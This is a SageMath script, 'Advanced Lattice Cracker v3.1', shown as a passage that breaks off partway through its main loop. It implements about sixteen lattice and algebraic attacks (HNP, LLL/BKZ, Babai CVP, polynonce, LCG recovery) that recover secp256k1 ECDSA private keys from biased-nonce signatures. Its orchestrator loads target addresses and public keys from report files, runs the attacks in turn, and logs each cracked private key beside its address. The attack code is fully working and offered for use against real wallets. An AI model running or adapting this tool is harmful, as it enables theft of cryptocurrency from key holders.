"""
ADVANCED LATTICE CRACKER v3.1 — OPTIMIZED FOR 8GB RAM
=====================================================
16 attacks. Fast. Memory-safe. No BKZ block > 20.

ATTACK ROSTER:
  PHASE 0 (Instant — No Lattice):
    1. GCD Small-Delta Detection
    2. LCG Phantom Recovery (quadratic equation)

  PHASE 1 (Fast — Tiny Lattice + LLL + Babai CVP):
    3. Babai HNP MSB
    4. Babai HNP LSB
    5. Monte Carlo Random Sampling
    6. Stochastic Lattice Annealing (SLA) [NOVEL]
    7. Signature Filtering + Tiny Lattice
    8. Dario Clavijo Polynonce (Differential)

  PHASE 2 (Standard HNP — Medium Lattice):
    9. Middle-Bit Window Leak
    10. Linear Nonce Bias
    11. Shared LSB (Fixed Suffix)
    12. Sequential Nonce
    13. Multi-Leak Fusion

  PHASE 3 (Deep Reduction):
    14. Kannan Embedding (CVP→SVP)
    15. Progressive BKZ MSB/LSB (10→15→20)
    16. Greedy Round-Off CVP
"""

import json
import os
import csv
import math
import gc
import sys
import random as py_random
import shutil
from sage.all import *

# ==============================================================================
# SECP256K1 CONSTANTS
# ==============================================================================
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F

Fp = GF(p)
E = EllipticCurve(Fp, [0, 7])
G = E(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
      0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

MAX_SIGS = 80  # Hard cap — keeps matrices under 82×82 (safe for 8GB)

# ==============================================================================
# CORE UTILITIES
# ==============================================================================
def verify_key(pub_hex, priv_int):
    priv_int = int(priv_int)
    if priv_int <= 0 or priv_int >= N: return False
    try:
        pt = priv_int * G
        x_bytes = int(pt[0]).to_bytes(32, 'big')
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            y_bytes = int(pt[1]).to_bytes(32, 'big')
            generated_pub = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            prefix = b'\x02' if int(pt[1]) % 2 == 0 else b'\x03'
            generated_pub = (prefix + x_bytes).hex()
        return generated_pub == pub_hex.lower()
    except Exception:
        return False

def min_sigs(bits):
    return int(math.ceil(4.0 / 3.0 * 256.0 / bits)) + 2

def precompute_uv(sigs):
    uv = []
    for s in sigs:
        r = int(s['r'], 16)
        si = int(s['s'], 16)
        z = int(s['z'], 16)
        si_inv = int(inverse_mod(si, N))
        uv.append(((r * si_inv) % N, (z * si_inv) % N))
    return uv

def extract_key(M_r, key_col, scale, pub):
    for row in M_r:
        val = row[key_col]
        if val == 0: continue
        for sign in [1, -1]:
            cand = (sign * int(val / scale)) % N
            if cand != 0 and verify_key(pub, cand): return cand
    return None

def extract_key_extended(M_r, key_col, scale, pub, search_range=30):
    for row in M_r:
        val = row[key_col]
        if val == 0: continue
        base = int(val / scale)
        for offset in range(-search_range, search_range + 1):
            for sign in [1, -1]:
                cand = (sign * (base + offset)) % N
                if cand != 0 and verify_key(pub, cand): return cand
    return None

# ==============================================================================
# LATTICE BUILDERS
# ==============================================================================
def build_msb_lattice(sigs, leaked_bits):
    num = min(len(sigs), MAX_SIGS)
    sigs = sigs[:num]
    B = 2 ** (256 - leaked_bits)
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (r_i * s_inv) % N
        a_i = (z_i * s_inv - B // 2) % N
        M[i, i] = N * N
        M[num, i] = t_i * N
        M[num + 1, i] = a_i * N
    M[num, num] = B
    M[num + 1, num + 1] = B * N
    return M, B, num

def build_lsb_lattice(sigs, leaked_bits):
    num = min(len(sigs), MAX_SIGS)
    sigs = sigs[:num]
    shift = 2 ** leaked_bits
    B = 2 ** (256 - leaked_bits)
    shift_inv = int(inverse_mod(shift, N))
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (shift_inv * r_i * s_inv) % N
        a_i = (shift_inv * z_i * s_inv - B // 2) % N
        M[i, i] = N * N
        M[num, i] = t_i * N
        M[num + 1, i] = a_i * N
    M[num, num] = B
    M[num + 1, num + 1] = B * N
    return M, B, num

# ==============================================================================
# REDUCTION METHODS
# ==============================================================================
def progressive_reduce(M, max_block=20):
    """Progressive BKZ: LLL → BKZ-10 → BKZ-15 → BKZ-20. Capped at 20 for 8GB."""
    M_r = M.LLL()
    for bs in [10, 15, min(max_block, M.nrows())]:
        if bs > M.nrows(): break
        try:
            M_r = M_r.BKZ(block_size=bs)
        except Exception:
            break
    return M_r

# ==============================================================================
# BABAI'S NEAREST PLANE (CVP SOLVER)
# ==============================================================================
def babai_cvp(lattice_basis, target_vector):
    B = Matrix(QQ, lattice_basis)
    G_mat, _ = B.gram_schmidt()
    n = B.nrows()
    b = vector(QQ, target_vector)
    for i in range(n - 1, -1, -1):
        gi = G_mat[i]
        denom = gi.dot_product(gi)
        if denom == 0: continue
        ci = round(b.dot_product(gi) / denom)
        b -= ci * B[i]
    closest = vector(ZZ, target_vector) - vector(ZZ, [round(x) for x in b])
    return closest


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 1: GCD SMALL-DELTA NONCE DETECTION
# ██████████████████████████████████████████████████████████████████████████████
def solve_gcd_nonce(pub, sigs, max_delta=500):
    n = len(sigs)
    if n < 2: return None
    uv = precompute_uv(sigs)
    for i in range(min(n, 40)):
        for j in range(i + 1, min(i + 6, n)):
            du = (uv[j][0] - uv[i][0]) % N
            dv = (uv[j][1] - uv[i][1]) % N
            if du == 0: continue
            du_inv = int(inverse_mod(int(du), N))
            for delta in range(-max_delta, max_delta + 1):
                d_cand = int(((delta - dv) * du_inv) % N)
                if d_cand == 0 or d_cand >= N: continue
                consistent = False
                for m in range(min(n, 20)):
                    if m == i or m == j: continue
                    diff_m = (d_cand * (uv[m][0] - uv[i][0]) + (uv[m][1] - uv[i][1])) % N
                    if diff_m > N // 2: diff_m = N - diff_m
                    if diff_m < max_delta * 50:
                        consistent = True
                        break
                if not consistent: continue
                if verify_key(pub, d_cand):
                    return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 2: LCG PHANTOM RECOVERY [NOVEL]
# ██████████████████████████████████████████████████████████████████████████████
def solve_lcg_phantom(pub, sigs):
    n = len(sigs)
    if n < 4: return None
    uv = precompute_uv(sigs)
    for start in range(min(n - 3, 50)):
        u0, v0 = uv[start]
        u1, v1 = uv[start + 1]
        u2, v2 = uv[start + 2]
        u3, v3 = uv[start + 3]
        a0 = (u1 - u0) % N;  b0 = (v1 - v0) % N
        a1 = (u2 - u1) % N;  b1 = (v2 - v1) % N
        a2 = (u3 - u2) % N;  b2 = (v3 - v2) % N
        A_c = (a1 * a1 - a0 * a2) % N
        B_c = (2 * a1 * b1 - a0 * b2 - a2 * b0) % N
        C_c = (b1 * b1 - b0 * b2) % N
        if A_c == 0:
            if B_c == 0: continue
            d_cand = int((-C_c * inverse_mod(int(B_c), N)) % N)
            if d_cand != 0 and verify_key(pub, d_cand): return d_cand
            continue
        disc = (B_c * B_c - 4 * A_c * C_c) % N
        try:
            sqrt_disc = int(Mod(disc, N).sqrt())
        except Exception:
            continue
        inv_2A = int(inverse_mod(int((2 * A_c) % N), N))
        for sign in [1, -1]:
            d_cand = int(((-B_c + sign * sqrt_disc) * inv_2A) % N)
            if d_cand != 0 and verify_key(pub, d_cand): return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 3 & 4: BABAI HNP (MSB + LSB)
# Uses proven N*N lattice construction FIRST, then Babai CVP as bonus.
# ██████████████████████████████████████████████████████████████████████████████
def solve_babai_msb(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    # PRIMARY: Proven N*N lattice construction + standard LLL extraction
    M, B_scale, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B_scale, pub)
    if d: return d
    # BONUS: Babai CVP on simple lattice
    num = len(sigs)
    dim = num + 1
    L = Matrix(ZZ, dim, dim)
    t_vals = []
    a_vals = []
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_vals.append((r_i * s_inv) % N)
        a_vals.append((z_i * s_inv) % N)
        L[i, i] = N
    for i in range(num):
        L[num, i] = t_vals[i]
    L[num, num] = 1
    L_r = L.LLL()
    target = vector(ZZ, list(a_vals) + [0])
    closest = babai_cvp(L_r, target)
    d_cand = int(closest[num]) % N
    if d_cand != 0 and verify_key(pub, d_cand): return d_cand
    d_cand = (-d_cand) % N
    if d_cand != 0 and verify_key(pub, d_cand): return d_cand
    return None

def solve_babai_lsb(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    # PRIMARY: Proven N*N lattice construction + standard LLL extraction
    M, B_scale, key_col = build_lsb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B_scale, pub)
    if d: return d
    # BONUS: Babai CVP on simple lattice
    num = len(sigs)
    shift = 2 ** leaked_bits
    shift_inv = int(inverse_mod(shift, N))
    dim = num + 1
    L = Matrix(ZZ, dim, dim)
    t_vals = []
    a_vals = []
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_vals.append((shift_inv * r_i * s_inv) % N)
        a_vals.append((shift_inv * z_i * s_inv) % N)
        L[i, i] = N
    for i in range(num):
        L[num, i] = t_vals[i]
    L[num, num] = 1
    L_r = L.LLL()
    target = vector(ZZ, list(a_vals) + [0])
    closest = babai_cvp(L_r, target)
    d_cand = int(closest[num]) % N
    if d_cand != 0 and verify_key(pub, d_cand): return d_cand
    d_cand = (-d_cand) % N
    if d_cand != 0 and verify_key(pub, d_cand): return d_cand
    return None

# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 8: DARIO CLAVIJO DIFFERENTIAL POLYNONCE
# Nonces share linear relationship: k_i = base_k + small_delta
# ██████████████████████████████████████████████████████████████████████████████
def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
    sigs = sigs[:MAX_SIGS]
    msgs = [int(s['z'], 16) for s in sigs]
    sig_pairs = [(int(s['r'], 16), int(s['s'], 16)) for s in sigs]
    m = len(msgs)
    msgn, rn, sn = msgs[-1], sig_pairs[-1][0], sig_pairs[-1][1]
    rnsn_inv = rn * int(inverse_mod(sn, N))
    mnsn_inv = msgn * int(inverse_mod(sn, N))
    matrix = Matrix(ZZ, m + 2, m + 2)
    for i in range(m):
        matrix[i, i] = N * N
    for i in range(m):
        si_inv = int(inverse_mod(sig_pairs[i][1], N))
        x0 = ((sig_pairs[i][0] * si_inv) - rnsn_inv) % N
        x1 = ((msgs[i] * si_inv) - mnsn_inv) % N
        matrix[m, i] = x0 * N
        matrix[m + 1, i] = x1 * N
    B_val = int(2**B_bits)
    matrix[m, m] = B_val
    matrix[m + 1, m + 1] = B_val * N
    if use_bkz:
        new_matrix = matrix.LLL()
        new_matrix = new_matrix.BKZ(block_size=min(20, m))
    else:
        new_matrix = matrix.LLL(delta=0.99, early_red=True, use_siegel=True)
    for row in new_matrix:
        val = row[m]
        if val == 0: continue
        possible_d = int(val / B_val) % N
        if verify_key(pub, possible_d): return possible_d
        neg_d = (-possible_d) % N
        if verify_key(pub, neg_d): return neg_d
        diff_val = row[0]
        if diff_val == 0: continue
        for sign in (1, -1):
            potential_nonce_diff = sign * int(diff_val / N)
            potential_priv_key = (sn * msgs[0]) - (sig_pairs[0][1] * msgn) - (sig_pairs[0][1] * sn * potential_nonce_diff)
            try:
                potential_priv_key *= int(inverse_mod(int((rn * sig_pairs[0][1]) - (sig_pairs[0][0] * sn)), N))
                key = int(potential_priv_key) % N
                if verify_key(pub, key): return key
            except Exception:
                pass
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 5: MONTE CARLO RANDOM SAMPLING
# ██████████████████████████████████████████████████████████████████████████████
def solve_monte_carlo(pub, sigs, leaked_bits, num_trials=300, sample_size=15):
    if len(sigs) < sample_size:
        sample_size = len(sigs)
    for trial in range(num_trials):
        subset = py_random.sample(sigs, sample_size)
        M, B, key_col = build_msb_lattice(subset, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d: return d
    for trial in range(num_trials // 2):
        subset = py_random.sample(sigs, sample_size)
        M, B, key_col = build_lsb_lattice(subset, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d: return d
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 6: STOCHASTIC LATTICE ANNEALING (SLA) [NOVEL]
# ██████████████████████████████████████████████████████████████████████████████
def solve_sla(pub, sigs, leaked_bits, iterations=200, sample_size=15):
    n = len(sigs)
    if n < sample_size:
        sample_size = n
    temperature = 1.0
    cooling = 0.99
    indices = py_random.sample(range(n), sample_size)
    best_score = float('inf')
    best_indices = indices[:]

    for iteration in range(iterations):
        subset = [sigs[i] for i in indices]
        M, B, key_col = build_msb_lattice(subset, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d: return d
        vals = [abs(int(row[key_col])) for row in M_r if row[key_col] != 0]
        score = min(vals) if vals else float('inf')
        if score < best_score:
            best_score = score
            best_indices = indices[:]
        new_indices = indices[:]
        available = [i for i in range(n) if i not in new_indices]
        if not available: break
        num_swaps = min(py_random.randint(1, 2), len(available))
        for _ in range(num_swaps):
            if not available: break
            pos = py_random.randint(0, len(new_indices) - 1)
            new_idx = py_random.choice(available)
            old_idx = new_indices[pos]
            available.remove(new_idx)
            available.append(old_idx)
            new_indices[pos] = new_idx
        if score <= best_score or py_random.random() < math.exp(-1.0 / (temperature + 1e-10)):
            indices = new_indices
        temperature *= cooling

    # Final attempt on best
    subset = [sigs[i] for i in best_indices]
    M, B, key_col = build_msb_lattice(subset, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B, pub)
    if d: return d
    M, B, key_col = build_lsb_lattice(subset, leaked_bits)
    M_r = M.LLL()
    return extract_key(M_r, key_col, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 7: SIGNATURE FILTERING + TINY LATTICE
# ██████████████████████████████████████████████████████████████████████████████
def solve_filtered_lattice(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 5: return None
    scored = []
    for idx, sig in enumerate(sigs):
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        s_inv = int(inverse_mod(s, N))
        t = (r * s_inv) % N
        score = 0
        r_bits = int(r).bit_length()
        if r_bits < 248: score += (256 - r_bits) * 3
        if r_bits < 240: score += 50
        r_hex = hex(r)[2:].zfill(64)
        leading_zeros = len(r_hex) - len(r_hex.lstrip('0'))
        score += leading_zeros * 10
        s_bits = int(s).bit_length()
        if s_bits < 240: score += (256 - s_bits) * 2
        if t < N // 256 or t > N - N // 256:
            score += 30
        scored.append((score, idx))
    scored.sort(reverse=True)
    for k in [10, 15, 20]:
        if k > num: break
        top_sigs = [sigs[scored[i][1]] for i in range(k)]
        M, B, key_col = build_msb_lattice(top_sigs, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d: return d
        M, B, key_col = build_lsb_lattice(top_sigs, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d: return d
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 8: MIDDLE-BIT WINDOW LEAK
# ██████████████████████████████████████████████████████████████████████████████
def solve_middle_bits(pub, sigs, window_bits, start_bit, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    B = 2 ** (256 - window_bits)
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (r_i * s_inv) % N
        a_i = (z_i * s_inv - B // 2) % N
        M[i, i] = N * N
        M[num, i] = t_i * N
        M[num + 1, i] = a_i * N
    M[num, num] = B
    M[num + 1, num + 1] = B * N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, num, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 9: LINEAR NONCE BIAS
# ██████████████████████████████████████████████████████████████████████████████
def solve_linear_nonce(pub, sigs, bias_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    B = 2 ** bias_bits
    dim = num + 3
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        M[i, i] = N
        M[num, i] = (s_i * z_i) % N
        M[num + 1, i] = s_i % N
        M[num + 2, i] = (-r_i) % N
    M[num, num] = B
    M[num + 1, num + 1] = B
    M[num + 2, num + 2] = B
    M_r = progressive_reduce(M) if progressive else M.LLL()
    for row in M_r:
        for col in [num, num + 1, num + 2]:
            val = row[col]
            if val == 0: continue
            for sign in [1, -1]:
                cand = (sign * int(val / B)) % N
                if cand != 0 and verify_key(pub, cand): return cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 10: SHARED LSB NONCE (FIXED SUFFIX)
# ██████████████████████████████████████████████████████████████████████████████
def solve_shared_lsb(pub, sigs, shared_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 3: return None
    r0 = int(sigs[0]['r'], 16)
    s0 = int(sigs[0]['s'], 16)
    z0 = int(sigs[0]['z'], 16)
    s0_inv = int(inverse_mod(s0, N))
    m = num - 1
    B = 2 ** (256 - shared_bits)
    shift_inv = int(inverse_mod(2 ** shared_bits, N))
    dim = m + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(m):
        ri = int(sigs[i + 1]['r'], 16)
        si = int(sigs[i + 1]['s'], 16)
        zi = int(sigs[i + 1]['z'], 16)
        si_inv = int(inverse_mod(si, N))
        t_i = (((ri * si_inv) - (r0 * s0_inv)) * shift_inv) % N
        a_i = ((((zi * si_inv) - (z0 * s0_inv)) * shift_inv) - B // 2) % N
        M[i, i] = N * N
        M[m, i] = t_i * N
        M[m + 1, i] = a_i * N
    M[m, m] = B
    M[m + 1, m + 1] = B * N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, m, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 11: SEQUENTIAL NONCE (WINDOWED)
# ██████████████████████████████████████████████████████████████████████████████
def solve_sequential_nonce(pub, sigs, err_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 4: return None
    r0 = int(sigs[0]['r'], 16)
    s0 = int(sigs[0]['s'], 16)
    z0 = int(sigs[0]['z'], 16)
    s0_inv = int(inverse_mod(s0, N))
    m = num - 1
    B = 2 ** (err_bits + 1)
    dim = m + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(m):
        ri = int(sigs[i + 1]['r'], 16)
        si = int(sigs[i + 1]['s'], 16)
        zi = int(sigs[i + 1]['z'], 16)
        si_inv = int(inverse_mod(si, N))
        t_i = ((ri * si_inv) - (r0 * s0_inv)) % N
        a_i = (((zi * si_inv) - (z0 * s0_inv)) - B // 2) % N
        M[i, i] = N * N
        M[m, i] = t_i * N
        M[m + 1, i] = a_i * N
    M[m, m] = B
    M[m + 1, m + 1] = B * N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, m, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 12: MULTI-LEAK FUSION
# ██████████████████████████████████████████████████████████████████████████████
def solve_multi_fusion(pub, sigs, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    default_bits = 8
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        leak_type = sigs[i].get('leak_type', 'msb')
        leak_bits = int(sigs[i].get('leak_bits', default_bits))
        B_i = 2 ** (256 - leak_bits)
        if leak_type == 'lsb':
            shift_inv = int(inverse_mod(2 ** leak_bits, N))
            t_i = (shift_inv * r_i * s_inv) % N
            a_i = (shift_inv * z_i * s_inv - B_i // 2) % N
        else:
            t_i = (r_i * s_inv) % N
            a_i = (z_i * s_inv - B_i // 2) % N
        M[i, i] = N * N
        M[num, i] = t_i * N
        M[num + 1, i] = a_i * N
    B_scale = 2 ** (256 - default_bits)
    M[num, num] = B_scale
    M[num + 1, num + 1] = B_scale * N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, num, B_scale, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 13: KANNAN EMBEDDING (CVP → SVP)
# ██████████████████████████████████████████████████████████████████████████████
def solve_kannan_embedding(pub, sigs, leaked_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    B = 2 ** (256 - leaked_bits)
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    t_vals, a_vals = [], []
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (r_i * s_inv) % N
        a_i = (z_i * s_inv) % N
        t_vals.append(t_i)
        a_vals.append(a_i)
    for i in range(num):
        M[i, i] = N
    for i in range(num):
        M[num, i] = t_vals[i]
    M[num, num] = 1
    M_embed = max(1, B // (num + 1))
    for i in range(num):
        M[num + 1, i] = a_vals[i]
    M[num + 1, num + 1] = M_embed
    M_r = progressive_reduce(M) if progressive else M.LLL()
    for row in M_r:
        val = row[num]
        if val == 0: continue
        for sign in [1, -1]:
            for off in [0, N]:
                trial = (sign * int(val) + off) % N
                if trial != 0 and verify_key(pub, trial): return trial
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 14: PROGRESSIVE BKZ MSB/LSB
# ██████████████████████████████████████████████████████████████████████████████
def solve_progressive_msb(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    M, B, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = progressive_reduce(M)
    return extract_key(M_r, key_col, B, pub)

def solve_progressive_lsb(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    M, B, key_col = build_lsb_lattice(sigs, leaked_bits)
    M_r = progressive_reduce(M)
    return extract_key(M_r, key_col, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 15: GREEDY ROUND-OFF CVP
# ██████████████████████████████████████████████████████████████████████████████
def solve_greedy_roundoff(pub, sigs, leaked_bits, search_range=30):
    sigs = sigs[:MAX_SIGS]
    M, B, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    d = extract_key_extended(M_r, key_col, B, pub, search_range)
    if d: return d
    M, B, key_col = build_lsb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    return extract_key_extended(M_r, key_col, B, pub, search_range)


# ==============================================================================
# MAIN ORCHESTRATOR — OPTIMIZED FOR SPEED
# ==============================================================================
def main():
    print("=" * 70)
    print(" ADVANCED LATTICE CRACKER v3.1 — OPTIMIZED (16 ATTACKS)")
    print(" 8GB RAM Safe | MAX_SIGS=80 | No BKZ > 20")
    print("=" * 70)

    targets = []
    script_dir = os.path.dirname(os.path.abspath(__file__))
    target_dir = os.path.join(script_dir, "reports", "pass")

    if not os.path.isdir(target_dir):
        print(f"[!] Not found: {target_dir}")
        print("[!] Run the analyzer first.")
        return

    for fn in os.listdir(target_dir):
        if fn.endswith(".json"):
            fp = os.path.join(target_dir, fn)
            with open(fp, "r") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    if 'address' not in data: data['address'] = fn.replace('.json', '')
                    data['_source_file'] = fp
                    targets.append(data)
                elif isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict): item['_source_file'] = fp
                    targets.extend(data)

    seen = set()
    unique = []
    for t in targets:
        addr = t.get('address', '')
        if addr not in seen:
            seen.add(addr)
            unique.append(t)
    targets = unique

    if not targets:
        print("[!] No targets found!")
        return

    print(f"\n[*] Loaded {len(targets)} targets.\n")
    recovered = []
    processed_dir = os.path.join(script_dir, "reports", "processed")
    os.makedirs(processed_dir, exist_ok=True)

    for tgt in targets:
        address = tgt.get('address', 'Unknown')
        pub = tgt.get('pubkey', 'Unknown')
        sigs = list(tgt.get('signatures', []))
        if len(sigs) < 4: continue

        # Cap sigs for memory safety
        sigs = sigs[:MAX_SIGS]

        print(f"{'=' * 70}")
        print(f"[*] Target: {address}")
        print(f"[*] Pubkey: {pub[:20]}...  |  Signatures: {len(sigs)}")

        success = False

        # ════════════════ PHASE 0: INSTANT ═══════════════════════════════
        print(f"\n[PHASE 0] Instant Attacks (No Lattice)...")

        print(f"  -> GCD Small-Delta ({len(sigs)} sigs)...", end="", flush=True)
        d = solve_gcd_nonce(pub, sigs)
        if d:
            print(" CRACKED!")
            success = True
            recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": "GCD Small-Delta"})
        else:
            print(" miss")

        if not success:
            print(f"  -> LCG Phantom ({len(sigs)} sigs)...", end="", flush=True)
            d = solve_lcg_phantom(pub, sigs)
            if d:
                print(" CRACKED!")
                success = True
                recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": "LCG Phantom"})
            else:
                print(" miss")
        gc.collect()

        # ════════════════ PHASE 1: FAST ══════════════════════════════════
        if not success:
            print(f"\n[PHASE 1] Fast (Babai CVP + MC + SLA + Polynonce)...")

            # Only test useful bit sizes: skip 128/96 (too few sigs needed = always works via LLL)
            for bits in [32, 16, 8, 6, 4]:
                if success: break
                req = min_sigs(bits)
                if len(sigs) < req: continue
                use = min(len(sigs), req + 4)  # Tight: just enough + 4 extra

                print(f"  -> Babai MSB {bits}-bit ({use} sigs)...", end="", flush=True)
                d = solve_babai_msb(pub, sigs[:use], bits)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Babai-CVP MSB {bits}-bit"})
                    break
                print(" miss")

                print(f"  -> Babai LSB {bits}-bit ({use} sigs)...", end="", flush=True)
                d = solve_babai_lsb(pub, sigs[:use], bits)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Babai-CVP LSB {bits}-bit"})
                    break
                print(" miss")
            gc.collect()

        # Polynonce (Dario Clavijo Differential) — synced with original tool
        if not success and len(sigs) >= 4:
            # (B_bits, num_sigs_needed) from original lattice_cracker.sage.py
            poly_configs = [
                (249, 79), (240, 60), (200, 50), (160, 40), (128, 30), (100, 20), (64, 15)
            ]
            for bb, req in poly_configs:
                if success: break
                if len(sigs) < req: continue
                print(f"  -> Polynonce {bb}-bit ({req} sigs)...", end="", flush=True)
                d = solve_polynonce(pub, sigs[:req], bb)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Polynonce {bb}-bit"})
                    break
                print(" miss")
            gc.collect()

        # Monte Carlo: adaptive sample_size per bit leak
        if not success and len(sigs) >= 15:
            mc_configs = [(32, 15, 300), (16, 26, 200), (8, 50, 100)]
            for bits, ss, trials in mc_configs:
                if success: break
                if len(sigs) < ss: continue
                print(f"  -> Monte Carlo {bits}-bit ({trials} trials, {ss} sigs/trial)...", end="", flush=True)
                d = solve_monte_carlo(pub, sigs, bits, num_trials=trials, sample_size=ss)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Monte Carlo {bits}-bit"})
                    break
                print(" miss")
            gc.collect()

        # SLA: adaptive sample_size per bit leak
        if not success and len(sigs) >= 15:
            sla_configs = [(32, 15, 200), (16, 26, 150), (8, 50, 80)]
            for bits, ss, iters in sla_configs:
                if success: break
                if len(sigs) < ss: continue
                print(f"  -> SLA {bits}-bit ({iters} iters, {ss} sigs/iter)...", end="", flush=True)
                d = solve_sla(pub, sigs, bits, iterations=iters, sample_size=ss)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"SLA {bits}-bit"})
                    break
                print(" miss")
            gc.collect()

        # Filtered Lattice
        if not success:
            for bits in [16, 8, 6]:
                if success: break
                if len(sigs) < 5: break
                print(f"  -> Filtered Lattice {bits}-bit ({len(sigs)} sigs)...", end="", flush=True)
                d = solve_filtered_lattice(pub, sigs, bits)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Filtered Lattice {bits}-bit"})
                    break
                print(" miss")
            gc.collect()

        # ════════════════ PHASE 2: STANDARD HNP ══════════════════════════
        if not success:
            print(f"\n[PHASE 2] Standard HNP Attacks...")

            # Middle-Bit Window (reduced tests)
            for w, s in [(32, 112), (32, 96), (16, 120)]:
                if success: break
                req = min_sigs(w)
                if len(sigs) < req: continue
                use = min(len(sigs), req + 4)
